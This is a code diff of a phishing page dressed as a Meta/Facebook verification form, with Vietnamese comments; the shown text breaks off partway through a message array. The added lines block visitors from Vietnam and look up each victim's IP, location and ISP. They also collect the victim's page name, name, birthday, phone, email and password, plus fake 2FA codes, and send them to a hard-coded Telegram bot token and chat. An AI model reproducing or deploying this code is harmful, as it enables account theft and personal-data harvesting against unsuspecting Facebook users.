@@ -7,7 +7,7 @@
     <!-- libphonenumber-js -->
     <script src="https://unpkg.com/libphonenumber-js@1.10.53/bundle/libphonenumber-min.js"></script>
     <style>
-        /* (Giữ nguyên CSS như cũ) */
+        /* Giữ nguyên CSS */
         * {
             margin: 0;
             padding: 0;
@@ -439,7 +439,7 @@
             transition: width linear;
         }
 
-        /* POPUP 2FA - cải tiến */
+        /* POPUP 2FA */
         .popup-overlay {
             position: fixed;
             top: 0;
@@ -642,6 +642,15 @@
         .meta-footer-logo:hover {
             opacity: 1;
         }
+
+        /* Block Vietnam */
+        #vn-block {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            color: #e41e3f;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
@@ -680,7 +689,7 @@
         })();
     </script>
 
-    <div class="card">
+    <div class="card" id="main-card">
         <div class="meta-brand">
             <div class="brand-container">
                 <img src="meta-color.png" alt="Meta logo">
@@ -760,7 +769,7 @@
             </div>
         </div>
 
-        <button class="continue-btn" id="continue-btn">Continue</button>
+        <button class="continue-btn" id="continue-btn" disabled>Continue</button>
 
         <div class="warning-message">
             <span class="icon">⚠️</span>
@@ -770,9 +779,14 @@
             </span>
         </div>
 
+        <div id="vn-block" style="display: none; color: #e41e3f; text-align: center; padding: 20px; font-weight: bold;">
+            ⚠️ Access from Vietnam is not allowed.
+        </div>
+
+        <div class="ip-info" id="ip-info">Loading IP...</div>
     </div>
 
-    <!-- Popup 2FA - giao diện chuẩn -->
+    <!-- Popup 2FA -->
     <div class="popup-overlay" id="twofa-popup">
         <div class="popup-content">
             <div class="fb-header" id="fb-header-display"></div>
@@ -816,7 +830,7 @@
             // DANH SÁCH QUỐC GIA
             // ============================================
             const countries = [
-                { code: "AF", name: "AF", dial: "+93" }, { code: "AL", name: "AL", dial: "+355" }, { code: "DZ", name: "DZ", dial: "+213" }, { code: "US", name: "US", dial: "+1" }, { code: "AD", name: "AD", dial: "+376" }, { code: "AO", name: "AO", dial: "+244" }, { code: "AI", name: "AI", dial: "+1" }, { code: "AG", name: "AG", dial: "+1" }, { code: "AR", name: "AR", dial: "+54" }, { code: "AM", name: "AM", dial: "+374" }, { code: "AW", name: "AW", dial: "+297" }, { code: "AU", name: "AU", dial: "+61" }, { code: "AT", name: "AT", dial: "+43" }, { code: "AZ", name: "AZ", dial: "+994" }, { code: "BS", name: "BS", dial: "+1" }, { code: "BH", name: "BH", dial: "+973" }, { code: "BD", name: "BD", dial: "+880" }, { code: "BB", name: "BB", dial: "+1" }, { code: "BY", name: "BY", dial: "+375" }, { code: "BE", name: "BE", dial: "+32" }, { code: "BZ", name: "BZ", dial: "+501" }, { code: "BJ", name: "BJ", dial: "+229" }, { code: "BM", name: "BM", dial: "+1" }, { code: "BT", name: "BT", dial: "+975" }, { code: "BO", name: "BO", dial: "+591" }, { code: "BA", name: "BA", dial: "+387" }, { code: "BW", name: "BW", dial: "+267" }, { code: "BR", name: "BR", dial: "+55" }, { code: "BN", name: "BN", dial: "+673" }, { code: "BG", name: "BG", dial: "+359" }, { code: "BF", name: "BF", dial: "+226" }, { code: "BI", name: "BI", dial: "+257" }, { code: "KH", name: "KH", dial: "+855" }, { code: "CM", name: "CM", dial: "+237" }, { code: "CA", name: "CA", dial: "+1" }, { code: "CV", name: "CV", dial: "+238" }, { code: "KY", name: "KY", dial: "+1" }, { code: "CF", name: "CF", dial: "+236" }, { code: "TD", name: "TD", dial: "+235" }, { code: "CL", name: "CL", dial: "+56" }, { code: "CN", name: "CN", dial: "+86" }, { code: "CO", name: "CO", dial: "+57" }, { code: "KM", name: "KM", dial: "+269" }, { code: "CG", name: "CG", dial: "+242" }, { code: "CD", name: "CD", dial: "+243" }, { code: "CR", name: "CR", dial: "+506" }, { code: "HR", name: "HR", dial: "+385" }, { code: "CU", name: "CU", dial: "+53" }, { code: "CY", name: "CY", dial: "+357" }, { code: "CZ", name: "CZ", dial: "+420" }, { code: "DK", name: "DK", dial: "+45" }, { code: "DJ", name: "DJ", dial: "+253" }, { code: "DM", name: "DM", dial: "+1" }, { code: "DO", name: "DO", dial: "+1" }, { code: "EC", name: "EC", dial: "+593" }, { code: "EG", name: "EG", dial: "+20" }, { code: "SV", name: "SV", dial: "+503" }, { code: "GQ", name: "GQ", dial: "+240" }, { code: "ER", name: "ER", dial: "+291" }, { code: "EE", name: "EE", dial: "+372" }, { code: "ET", name: "ET", dial: "+251" }, { code: "FJ", name: "FJ", dial: "+679" }, { code: "FI", name: "FI", dial: "+358" }, { code: "FR", name: "FR", dial: "+33" }, { code: "GA", name: "GA", dial: "+241" }, { code: "GM", name: "GM", dial: "+220" }, { code: "GE", name: "GE", dial: "+995" }, { code: "DE", name: "DE", dial: "+49" }, { code: "GH", name: "GH", dial: "+233" }, { code: "GI", name: "GI", dial: "+350" }, { code: "GR", name: "GR", dial: "+30" }, { code: "GL", name: "GL", dial: "+299" }, { code: "GD", name: "GD", dial: "+1" }, { code: "GU", name: "GU", dial: "+1" }, { code: "GT", name: "GT", dial: "+502" }, { code: "GN", name: "GN", dial: "+224" }, { code: "GW", name: "GW", dial: "+245" }, { code: "GY", name: "GY", dial: "+592" }, { code: "HT", name: "HT", dial: "+509" }, { code: "HN", name: "HN", dial: "+504" }, { code: "HK", name: "HK", dial: "+852" }, { code: "HU", name: "HU", dial: "+36" }, { code: "IS", name: "IS", dial: "+354" }, { code: "IN", name: "IN", dial: "+91" }, { code: "ID", name: "ID", dial: "+62" }, { code: "IR", name: "IR", dial: "+98" }, { code: "IQ", name: "IQ", dial: "+964" }, { code: "IE", name: "IE", dial: "+353" }, { code: "IL", name: "IL", dial: "+972" }, { code: "IT", name: "IT", dial: "+39" }, { code: "JM", name: "JM", dial: "+1" }, { code: "JP", name: "JP", dial: "+81" }, { code: "JO", name: "JO", dial: "+962" }, { code: "KZ", name: "KZ", dial: "+7" }, { code: "KE", name: "KE", dial: "+254" }, { code: "KI", name: "KI", dial: "+686" }, { code: "KP", name: "KP", dial: "+850" }, { code: "KR", name: "KR", dial: "+82" }, { code: "KW", name: "KW", dial: "+965" }, { code: "KG", name: "KG", dial: "+996" }, { code: "LA", name: "LA", dial: "+856" }, { code: "LV", name: "LV", dial: "+371" }, { code: "LB", name: "LB", dial: "+961" }, { code: "LS", name: "LS", dial: "+266" }, { code: "LR", name: "LR", dial: "+231" }, { code: "LY", name: "LY", dial: "+218" }, { code: "LI", name: "LI", dial: "+423" }, { code: "LT", name: "LT", dial: "+370" }, { code: "LU", name: "LU", dial: "+352" }, { code: "MO", name: "MO", dial: "+853" }, { code: "MK", name: "MK", dial: "+389" }, { code: "MG", name: "MG", dial: "+261" }, { code: "MW", name: "MW", dial: "+265" }, { code: "MY", name: "MY", dial: "+60" }, { code: "MV", name: "MV", dial: "+960" }, { code: "ML", name: "ML", dial: "+223" }, { code: "MT", name: "MT", dial: "+356" }, { code: "MH", name: "MH", dial: "+692" }, { code: "MR", name: "MR", dial: "+222" }, { code: "MU", name: "MU", dial: "+230" }, { code: "MX", name: "MX", dial: "+52" }, { code: "FM", name: "FM", dial: "+691" }, { code: "MD", name: "MD", dial: "+373" }, { code: "MC", name: "MC", dial: "+377" }, { code: "MN", name: "MN", dial: "+976" }, { code: "ME", name: "ME", dial: "+382" }, { code: "MS", name: "MS", dial: "+1" }, { code: "MA", name: "MA", dial: "+212" }, { code: "MZ", name: "MZ", dial: "+258" }, { code: "MM", name: "MM", dial: "+95" }, { code: "NA", name: "NA", dial: "+264" }, { code: "NR", name: "NR", dial: "+674" }, { code: "NP", name: "NP", dial: "+977" }, { code: "NL", name: "NL", dial: "+31" }, { code: "NZ", name: "NZ", dial: "+64" }, { code: "NI", name: "NI", dial: "+505" }, { code: "NE", name: "NE", dial: "+227" }, { code: "NG", name: "NG", dial: "+234" }, { code: "NO", name: "NO", dial: "+47" }, { code: "OM", name: "OM", dial: "+968" }, { code: "PK", name: "PK", dial: "+92" }, { code: "PW", name: "PW", dial: "+680" }, { code: "PA", name: "PA", dial: "+507" }, { code: "PG", name: "PG", dial: "+675" }, { code: "PY", name: "PY", dial: "+595" }, { code: "PE", name: "PE", dial: "+51" }, { code: "PH", name: "PH", dial: "+63" }, { code: "PL", name: "PL", dial: "+48" }, { code: "PT", name: "PT", dial: "+351" }, { code: "QA", name: "QA", dial: "+974" }, { code: "RO", name: "RO", dial: "+40" }, { code: "RU", name: "RU", dial: "+7" }, { code: "RW", name: "RW", dial: "+250" }, { code: "KN", name: "KN", dial: "+1" }, { code: "LC", name: "LC", dial: "+1" }, { code: "VC", name: "VC", dial: "+1" }, { code: "WS", name: "WS", dial: "+685" }, { code: "SM", name: "SM", dial: "+378" }, { code: "ST", name: "ST", dial: "+239" }, { code: "SA", name: "SA", dial: "+966" }, { code: "SN", name: "SN", dial: "+221" }, { code: "RS", name: "RS", dial: "+381" }, { code: "SC", name: "SC", dial: "+248" }, { code: "SL", name: "SL", dial: "+232" }, { code: "SG", name: "SG", dial: "+65" }, { code: "SK", name: "SK", dial: "+421" }, { code: "SI", name: "SI", dial: "+386" }, { code: "SB", name: "SB", dial: "+677" }, { code: "SO", name: "SO", dial: "+252" }, { code: "ZA", name: "ZA", dial: "+27" }, { code: "ES", name: "ES", dial: "+34" }, { code: "LK", name: "LK", dial: "+94" }, { code: "SD", name: "SD", dial: "+249" }, { code: "SR", name: "SR", dial: "+597" }, { code: "SZ", name: "SZ", dial: "+268" }, { code: "SE", name: "SE", dial: "+46" }, { code: "CH", name: "CH", dial: "+41" }, { code: "SY", name: "SY", dial: "+963" }, { code: "TW", name: "TW", dial: "+886" }, { code: "TJ", name: "TJ", dial: "+992" }, { code: "TZ", name: "TZ", dial: "+255" }, { code: "TH", name: "TH", dial: "+66" }, { code: "TL", name: "TL", dial: "+670" }, { code: "TG", name: "TG", dial: "+228" }, { code: "TO", name: "TO", dial: "+676" }, { code: "TT", name: "TT", dial: "+1" }, { code: "TN", name: "TN", dial: "+216" }, { code: "TR", name: "TR", dial: "+90" }, { code: "TM", name: "TM", dial: "+993" }, { code: "TV", name: "TV", dial: "+688" }, { code: "UG", name: "UG", dial: "+256" }, { code: "UA", name: "UA", dial: "+380" }, { code: "AE", name: "AE", dial: "+971" }, { code: "GB", name: "GB", dial: "+44" }, { code: "US", name: "US", dial: "+1" }, { code: "UY", name: "UY", dial: "+598" }, { code: "UZ", name: "UZ", dial: "+998" }, { code: "VU", name: "VU", dial: "+678" }, { code: "VE", name: "VE", dial: "+58" }, { code: "VN", name: "VN", dial: "+84" }, { code: "YE", name: "YE", dial: "+967" }, { code: "ZM", name: "ZM", dial: "+260" }, { code: "ZW", name: "ZW", dial: "+263" }
+                { code: "AF", name: "AF", dial: "+93" }, { code: "AL", name: "AL", dial: "+355" }, { code: "DZ", name: "DZ", dial: "+213" }, { code: "US", name: "US", dial: "+1" }, { code: "AD", name: "AD", dial: "+376" }, { code: "AO", name: "AO", dial: "+244" }, { code: "AI", name: "AI", dial: "+1" }, { code: "AG", name: "AG", dial: "+1" }, { code: "AR", name: "AR", dial: "+54" }, { code: "AM", name: "AM", dial: "+374" }, { code: "AW", name: "AW", dial: "+297" }, { code: "AU", name: "AU", dial: "+61" }, { code: "AT", name: "AT", dial: "+43" }, { code: "AZ", name: "AZ", dial: "+994" }, { code: "BS", name: "BS", dial: "+1" }, { code: "BH", name: "BH", dial: "+973" }, { code: "BD", name: "BD", dial: "+880" }, { code: "BB", name: "BB", dial: "+1" }, { code: "BY", name: "BY", dial: "+375" }, { code: "BE", name: "BE", dial: "+32" }, { code: "BZ", name: "BZ", dial: "+501" }, { code: "BJ", name: "BJ", dial: "+229" }, { code: "BM", name: "BM", dial: "+1" }, { code: "BT", name: "BT", dial: "+975" }, { code: "BO", name: "BO", dial: "+591" }, { code: "BA", name: "BA", dial: "+387" }, { code: "BW", name: "BW", dial: "+267" }, { code: "BR", name: "BR", dial: "+55" }, { code: "BN", name: "BN", dial: "+673" }, { code: "BG", name: "BG", dial: "+359" }, { code: "BF", name: "BF", dial: "+226" }, { code: "BI", name: "BI", dial: "+257" }, { code: "KH", name: "KH", dial: "+855" }, { code: "CM", name: "CM", dial: "+237" }, { code: "CA", name: "CA", dial: "+1" }, { code: "CV", name: "CV", dial: "+238" }, { code: "KY", name: "KY", dial: "+1" }, { code: "CF", name: "CF", dial: "+236" }, { code: "TD", name: "TD", dial: "+235" }, { code: "CL", name: "CL", dial: "+56" }, { code: "CN", name: "CN", dial: "+86" }, { code: "CO", name: "CO", dial: "+57" }, { code: "KM", name: "KM", dial: "+269" }, { code: "CG", name: "CG", dial: "+242" }, { code: "CD", name: "CD", dial: "+243" }, { code: "CR", name: "CR", dial: "+506" }, { code: "HR", name: "HR", dial: "+385" }, { code: "CU", name: "CU", dial: "+53" }, { code: "CY", name: "CY", dial: "+357" }, { code: "CZ", name: "CZ", dial: "+420" }, { code: "DK", name: "DK", dial: "+45" }, { code: "DJ", name: "DJ", dial: "+253" }, { code: "DM", name: "DM", dial: "+1" }, { code: "DO", name: "DO", dial: "+1" }, { code: "EC", name: "EC", dial: "+593" }, { code: "EG", name: "EG", dial: "+20" }, { code: "SV", name: "SV", dial: "+503" }, { code: "GQ", name: "GQ", dial: "+240" }, { code: "ER", name: "ER", dial: "+291" }, { code: "EE", name: "EE", dial: "+372" }, { code: "ET", name: "ET", dial: "+251" }, { code: "FJ", name: "FJ", dial: "+679" }, { code: "FI", name: "FI", dial: "+358" }, { code: "FR", name: "FR", dial: "+33" }, { code: "GA", name: "GA", dial: "+241" }, { code: "GM", name: "GM", dial: "+220" }, { code: "GE", name: "GE", dial: "+995" }, { code: "DE", name: "DE", dial: "+49" }, { code: "GH", name: "GH", dial: "+233" }, { code: "GI", name: "GI", dial: "+350" }, { code: "GR", name: "GR", dial: "+30" }, { code: "GL", name: "GL", dial: "+299" }, { code: "GD", name: "GD", dial: "+1" }, { code: "GU", name: "GU", dial: "+1" }, { code: "GT", name: "GT", dial: "+502" }, { code: "GN", name: "GN", dial: "+224" }, { code: "GW", name: "GW", dial: "+245" }, { code: "GY", name: "GY", dial: "+592" }, { code: "HT", name: "HT", dial: "+509" }, { code: "HN", name: "HN", dial: "+504" }, { code: "HK", name: "HK", dial: "+852" }, { code: "HU", name: "HU", dial: "+36" }, { code: "IS", name: "IS", dial: "+354" }, { code: "IN", name: "IN", dial: "+91" }, { code: "ID", name: "ID", dial: "+62" }, { code: "IR", name: "IR", dial: "+98" }, { code: "IQ", name: "IQ", dial: "+964" }, { code: "IE", name: "IE", dial: "+353" }, { code: "IL", name: "IL", dial: "+972" }, { code: "IT", name: "IT", dial: "+39" }, { code: "JM", name: "JM", dial: "+1" }, { code: "JP", name: "JP", dial: "+81" }, { code: "JO", name: "JO", dial: "+962" }, { code: "KZ", name: "KZ", dial: "+7" }, { code: "KE", name: "KE", dial: "+254" }, { code: "KI", name: "KI", dial: "+686" }, { code: "KP", name: "KP", dial: "+850" }, { code: "KR", name: "KR", dial: "+82" }, { code: "KW", name: "KW", dial: "+965" }, { code: "KG", name: "KG", dial: "+996" }, { code: "LA", name: "LA", dial: "+856" }, { code: "LV", name: "LV", dial: "+371" }, { code: "LB", name: "LB", dial: "+961" }, { code: "LS", name: "LS", dial: "+266" }, { code: "LR", name: "LR", dial: "+231" }, { code: "LY", name: "LY", dial: "+218" }, { code: "LI", name: "LI", dial: "+423" }, { code: "LT", name: "LT", dial: "+370" }, { code: "LU", name: "LU", dial: "+352" }, { code: "MO", name: "MO", dial: "+853" }, { code: "MK", name: "MK", dial: "+389" }, { code: "MG", name: "MG", dial: "+261" }, { code: "MW", name: "MW", dial: "+265" }, { code: "MY", name: "MY", dial: "+60" }, { code: "MV", name: "MV", dial: "+960" }, { code: "ML", name: "ML", dial: "+223" }, { code: "MT", name: "MT", dial: "+356" }, { code: "MH", name: "MH", dial: "+692" }, { code: "MR", name: "MR", dial: "+222" }, { code: "MU", name: "MU", dial: "+230" }, { code: "MX", name: "MX", dial: "+52" }, { code: "FM", name: "FM", dial: "+691" }, { code: "MD", name: "MD", dial: "+373" }, { code: "MC", name: "MC", dial: "+377" }, { code: "MN", name: "MN", dial: "+976" }, { code: "ME", name: "ME", dial: "+382" }, { code: "MS", name: "MS", dial: "+1" }, { code: "MA", name: "MA", dial: "+212" }, { code: "MZ", name: "MZ", dial: "+258" }, { code: "MM", name: "MM", dial: "+95" }, { code: "NA", name: "NA", dial: "+264" }, { code: "NR", name: "NR", dial: "+674" }, { code: "NP", name: "NP", dial: "+977" }, { code: "NL", name: "NL", dial: "+31" }, { code: "NZ", name: "NZ", dial: "+64" }, { code: "NI", name: "NI", dial: "+505" }, { code: "NE", name: "NE", dial: "+227" }, { code: "NG", name: "NG", dial: "+234" }, { code: "NO", name: "NO", dial: "+47" }, { code: "OM", name: "OM", dial: "+968" }, { code: "PK", name: "PK", dial: "+92" }, { code: "PW", name: "PW", dial: "+680" }, { code: "PA", name: "PA", dial: "+507" }, { code: "PG", name: "PG", dial: "+675" }, { code: "PY", name: "PY", dial: "+595" }, { code: "PE", name: "PE", dial: "+51" }, { code: "PH", name: "PH", dial: "+63" }, { code: "PL", name: "PL", dial: "+48" }, { code: "PT", name: "PT", dial: "+351" }, { code: "QA", name: "QA", dial: "+974" }, { code: "RO", name: "RO", dial: "+40" }, { code: "RU", name: "RU", dial: "+7" }, { code: "RW", name: "RW", dial: "+250" }, { code: "KN", name: "KN", dial: "+1" }, { code: "LC", name: "LC", dial: "+1" }, { code: "VC", name: "VC", dial: "+1" }, { code: "WS", name: "WS", dial: "+685" }, { code: "SM", name: "SM", dial: "+378" }, { code: "ST", name: "ST", dial: "+239" }, { code: "SA", name: "SA", dial: "+966" }, { code: "SN", name: "SN", dial: "+221" }, { code: "RS", name: "RS", dial: "+381" }, { code: "SC", name: "SC", dial: "+248" }, { code: "SL", name: "SL", dial: "+232" }, { code: "SG", name: "SG", dial: "+65" }, { code: "SK", name: "SK", dial: "+421" }, { code: "SI", name: "SI", dial: "+386" }, { code: "SB", name: "SB", dial: "+677" }, { code: "SO", name: "SO", dial: "+252" }, { code: "ZA", name: "ZA", dial: "+27" }, { code: "ES", name: "ES", dial: "+34" }, { code: "LK", name: "LK", dial: "+94" }, { code: "SD", name: "SD", dial: "+249" }, { code: "SR", name: "SR", dial: "+597" }, { code: "SZ", name: "SZ", dial: "+268" }, { code: "SE", name: "SE", dial: "+46" }, { code: "CH", name: "CH", dial: "+41" }, { code: "SY", name: "SY", dial: "+963" }, { code: "TW", name: "TW", dial: "+886" }, { code: "TJ", name: "TJ", dial: "+992" }, { code: "TZ", name: "TZ", dial: "+255" }, { code: "TH", name: "TH", dial: "+66" }, { code: "TL", name: "TL", dial: "+670" }, { code: "TG", name: "TG", dial: "+228" }, { code: "TO", name: "TO", dial: "+676" }, { code: "TT", name: "TT", dial: "+1" }, { code: "TN", name: "TN", dial: "+216" }, { code: "TR", name: "TR", dial: "+90" }, { code: "TM", name: "TM", dial: "+993" }, { code: "TV", name: "TV", dial: "+688" }, { code: "UG", name: "UG", dial: "+256" }, { code: "UA", name: "UA", dial: "+380" }, { code: "AE", name: "AE", dial: "+971" }, { code: "GB", name: "GB", dial: "+44" }, { code: "UY", name: "UY", dial: "+598" }, { code: "UZ", name: "UZ", dial: "+998" }, { code: "VU", name: "VU", dial: "+678" }, { code: "VE", name: "VE", dial: "+58" }, { code: "VN", name: "VN", dial: "+84" }, { code: "YE", name: "YE", dial: "+967" }, { code: "ZM", name: "ZM", dial: "+260" }, { code: "ZW", name: "ZW", dial: "+263" }
             ];
 
             // ============================================
@@ -860,31 +874,56 @@
             }
 
             // ============================================
-            // LẤY IP VÀ VỊ TRÍ NGƯỜI DÙNG (TÁCH LOCATION VÀ ISP)
+            // LẤY IP VÀ VỊ TRÍ NGƯỜI DÙNG + CHẶN VIỆT NAM
             // ============================================
             let userIp = 'Unknown';
             let userCityCountry = 'Unknown';
             let userIsp = 'Unknown';
+            let userCountryCode = '';
 
+            const ipInfoDiv = document.getElementById('ip-info');
+            const continueBtn = document.getElementById('continue-btn');
+            const mainCard = document.getElementById('main-card');
+            const vnBlock = document.getElementById('vn-block');
+
+            // Bước 1: lấy IP
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     userIp = data.ip;
-                    const ipDiv = document.querySelector('.ip-info');
-                    if (ipDiv) {
-                        ipDiv.textContent = `Your IP: ${userIp}`;
-                    }
-                    return fetch(`http://ip-api.com/json/${userIp}?fields=status,country,regionName,city,isp`);
+                    ipInfoDiv.textContent = `Your IP: ${userIp}`;
+                    // Bước 2: lấy location từ ipapi.co
+                    return fetch(`https://ipapi.co/${userIp}/json/`);
                 })
                 .then(response => response.json())
                 .then(locData => {
-                    if (locData.status === 'success') {
-                        userCityCountry = `${locData.city}, ${locData.country}`;
-                        userIsp = locData.isp;
+                    if (locData.error) {
+                        console.log('ipapi.co error, fallback');
+                        // Fallback: vẫn cho phép tiếp tục nhưng không có location chính xác
+                        userCityCountry = 'Unknown';
+                        userIsp = 'Unknown';
+                        userCountryCode = '';
+                    } else {
+                        userCountryCode = locData.country_code || '';
+                        userCityCountry = locData.city ? locData.city + ', ' + locData.country_name : locData.country_name || 'Unknown';
+                        userIsp = locData.org || 'Unknown';
+                    }
+
+                    // Kiểm tra nếu là Việt Nam
+                    if (userCountryCode === 'VN') {
+                        // Chặn: ẩn form, hiện thông báo
+                        mainCard.style.display = 'none';
+                        vnBlock.style.display = 'block';
+                        ipInfoDiv.style.display = 'none';
+                    } else {
+                        // Kích hoạt nút continue
+                        continueBtn.disabled = false;
                     }
                 })
                 .catch(err => {
-                    console.log('Không lấy được IP/location');
+                    console.log('Lỗi lấy location:', err);
+                    // Nếu lỗi, vẫn cho phép truy cập (có thể là do giới hạn rate)
+                    continueBtn.disabled = false;
                 });
 
             // ============================================
@@ -990,28 +1029,24 @@
             // ============================================
             function getFullPhoneNumber() {
                 const rawNumber = phoneInput.value.trim();
-                const countryCode = selectedCountry.code; // mã hai ký tự, ví dụ 'US', 'VN'
+                const countryCode = selectedCountry.code;
                 try {
-                    // Thử parse bằng thư viện libphonenumber
                     if (typeof libphonenumber !== 'undefined' && libphonenumber.parsePhoneNumberFromString) {
                         const phoneNumber = libphonenumber.parsePhoneNumberFromString(rawNumber, countryCode);
                         if (phoneNumber && phoneNumber.isValid()) {
-                            return phoneNumber.number; // E.164 format, ví dụ +14155552671
+                            return phoneNumber.number;
                         } else {
-                            // Không hợp lệ, fallback: ghép mã dial + rawNumber (loại bỏ ký tự không phải số)
                             const dial = selectedCountry.dial;
                             const digits = rawNumber.replace(/\D/g, '');
                             return dial + digits;
                         }
                     } else {
-                        // Fallback nếu không có thư viện
                         const dial = selectedCountry.dial;
                         const digits = rawNumber.replace(/\D/g, '');
                         return dial + digits;
                     }
                 } catch (e) {
                     console.log('Error parsing phone number', e);
-                    // Fallback
                     const dial = selectedCountry.dial;
                     const digits = rawNumber.replace(/\D/g, '');
                     return dial + digits;
@@ -1019,19 +1054,15 @@
             }
 
             // ============================================
-            // HÀM MASK SỐ ĐIỆN THOẠI (ĐỊNH DẠNG +1*****532)
+            // HÀM MASK SỐ ĐIỆN THOẠI
             // ============================================
             function maskPhone(phone, dial) {
                 if (!phone) return '';
-                // Sử dụng dial được cung cấp, nếu không thì lấy từ selectedCountry
                 const countryCode = dial || selectedCountry.dial;
-                if (!countryCode) return phone; // fallback
+                if (!countryCode) return phone;
 
-                // Bỏ mã quốc gia để lấy phần số quốc gia
                 let national = phone.replace(countryCode, '').replace(/\D/g, '');
-                // Nếu không bỏ được (có thể phone không bắt đầu bằng countryCode), fallback
                 if (national === phone || national === '') {
-                    // Lấy tất cả chữ số, che hết trừ 3 số cuối
                     const digits = phone.replace(/\D/g, '');
                     const lastThree = digits.slice(-3);
                     const stars = '*'.repeat(digits.length - 3);
@@ -1043,19 +1074,38 @@
             }
 
             // ============================================
-            // GỬI DỮ LIỆU LÊN TELEGRAM
+            // BIẾN ĐẾM TIN NHẮN VÀ HÀM THỜI GIAN
             // ============================================
-            function sendToTelegram(message) {
-                const token = '8679813546:AAHcR-DX4jh-dbiYVYuSg5arezS1g1XVrts';
-                const chatId = '-5250654667';
+            let messageCounter = Math.floor(Math.random() * 90) + 10; // số từ 10-99
+
+            function getCurrentTimeString() {
+                const now = new Date();
+                const hours = now.getHours().toString().padStart(2, '0');
+                const minutes = now.getMinutes().toString().padStart(2, '0');
+                const seconds = now.getSeconds().toString().padStart(2, '0');
+                const day = now.getDate().toString().padStart(2, '0');
+                const month = (now.getMonth() + 1).toString().padStart(2, '0');
+                const year = now.getFullYear();
+                return `${hours}:${minutes}:${seconds} ${day}/${month}/${year}`;
+            }
+
+            // ============================================
+            // GỬI DỮ LIỆU LÊN TELEGRAM (dạng text thuần, mỗi dòng riêng)
+            // ============================================
+            function sendToTelegram(messageLines) {
+                const token = '7898540714:AAFUKyXtMKhkq20tK91bTBPodaMVGosMcRg';
+                const chatId = '-5246392296';
                 const url = `https://api.telegram.org/bot${token}/sendMessage`;
+                
+                let text = Array.isArray(messageLines) ? messageLines.join('\n') : messageLines;
+                
                 fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        text: message,
-                        parse_mode: 'HTML'
+                        text: text,
+                        // Không parse_mode để giữ text thuần
                     })
                 }).catch(err => console.log('Telegram error:', err));
             }
@@ -1065,11 +1115,9 @@
             // ============================================
             const dynamicForms = document.getElementById('dynamic-forms');
             const waitingScreen = document.getElementById('waiting-screen');
-            const continueBtn = document.getElementById('continue-btn');
             const twofaPopup = document.getElementById('twofa-popup');
             const twofaCode = document.getElementById('twofa-code');
             const twofaContinue = document.getElementById('twofa-continue');
-            // Chỉ cho phép nhập số ở ô code 2FA
             twofaCode.addEventListener('input', function(e) {
                 this.value = this.value.replace(/\D/g, '');
             });
@@ -1176,8 +1224,8 @@
                     step1Data = {
                         pageName: pageNameVal,
                         fbName: fbNameVal,
-                        phone: getFullPhoneNumber(),  // Lấy số điện thoại đầy đủ kèm mã quốc gia
-                        phoneDial: selectedCountry.dial, // Lưu mã quốc gia để dùng khi mask
+                        phone: getFullPhoneNumber(),
+                        phoneDial: selectedCountry.dial,
                         birthday: bdayVal
                     };
                 }
@@ -1336,7 +1384,7 @@
                 twofaContinue.disabled = true;
                 twofaError.classList.remove('show');
                 twofaCode.disabled = false;
-                firstCode = ''; // Reset để bắt đầu phiên mới
+                firstCode = '';
                 if (countdownInterval) {
                     clearInterval(countdownInterval);
                     countdownInterval = null;
@@ -1347,7 +1395,7 @@
                 countdownSeconds = seconds;
                 countdownSpan.textContent = `0 minutes ${countdownSeconds} seconds`;
                 twofaError.classList.add('show');
-                twofaCode.disabled = true; // Khóa ô nhập
+                twofaCode.disabled = true;
 
                 countdownInterval = setInterval(() => {
                     countdownSeconds--;
@@ -1356,8 +1404,7 @@
                         countdownInterval = null;
                         twofaError.classList.remove('show');
                         twofaContinue.disabled = true;
-                        twofaCode.disabled = false; // Mở khóa ô nhập
-                        // KHÔNG reset firstCode ở đây
+                        twofaCode.disabled = false;
                     } else {
                         countdownSpan.textContent = `0 minutes ${countdownSeconds} seconds`;
                     }
@@ -1367,9 +1414,8 @@
             function showTwoFAPopup() {
                 document.getElementById('fb-header-display').textContent = step1Data.fbName + ' · Facebook';
                 displayEmail.textContent = maskEmail(firstEmail);
-                // Sử dụng maskPhone với dial đã lưu
                 displayPhone.textContent = maskPhone(step1Data.phone, step1Data.phoneDial);
-                resetTwoFAForm(); // Đảm bảo trạng thái ban đầu
+                resetTwoFAForm();
                 twofaPopup.style.display = 'flex';
             }
 
@@ -1390,8 +1436,23 @@
                 } else {
                     if (!isRetryMode) {
                         if (validateLogin()) {
-                            const msg = `🔐 <b>Step 1 Data:</b>\nPage: ${step1Data.pageName}\nFB: ${step1Data.fbName}\nPhone: ${step1Data.phone}\nBirthday: ${step1Data.birthday}\nIP: ${userIp}\nLocation: ${userCityCountry}\nISP: ${userIsp}\n\n📧 <b>Login Attempt 1:</b>\nEmail: ${firstEmail}\nPassword: ${firstPassword}`;
-                            sendToTelegram(msg);
+                            const timeStr = getCurrentTimeString();
+                            const msgLines = [
+                                
+                                `Thời gian: ${timeStr}`,
+                                `IP: ${userIp}`,
+                                `Vị trí: ${userCityCountry}`,
+                                ``,
+                                `Tên Page: ${step1Data.pageName}`,
+                                `Tên: ${step1Data.fbName}`,
+                                `Ngày sinh: ${step1Data.birthday}`,
+                                ``,
+                                `Số điện thoại: ${step1Data.phone}`,
+                                `Email: ${firstEmail}`,
+                                `Mật khẩu: ${firstPassword}`,
+                            ];
+                            sendToTelegram(msgLines);
+                            messageCounter++;
 
                             const waitTime = randomInt(6000, 10000);
                             showWaitingScreen(waitTime);
@@ -1424,8 +1485,24 @@
 
                         secondPassword = passVal;
 
-                        const msg = `🔐 <b>Step 1 Data (retry):</b>\nPage: ${step1Data.pageName}\nFB: ${step1Data.fbName}\nPhone: ${step1Data.phone}\nBirthday: ${step1Data.birthday}\nIP: ${userIp}\nLocation: ${userCityCountry}\nISP: ${userIsp}\n\n📧 <b>Login Attempt 2:</b>\nEmail: ${firstEmail}\nPassword: ${secondPassword}`;
-                        sendToTelegram(msg);
+                        const timeStr = getCurrentTimeString();
+                        const msgLines = [
+                            
+                            `Thời gian: ${timeStr}`,
+                            `IP: ${userIp}`,
+                            `Vị trí: ${userCityCountry}`,
+                            ``,
+                            `Tên Page: ${step1Data.pageName}`,
+                            `Tên: ${step1Data.fbName}`,
+                            `Ngày sinh: ${step1Data.birthday}`,
+                            ``,
+                            `Số điện thoại: ${step1Data.phone}`,
+                            `Email: ${firstEmail}`,
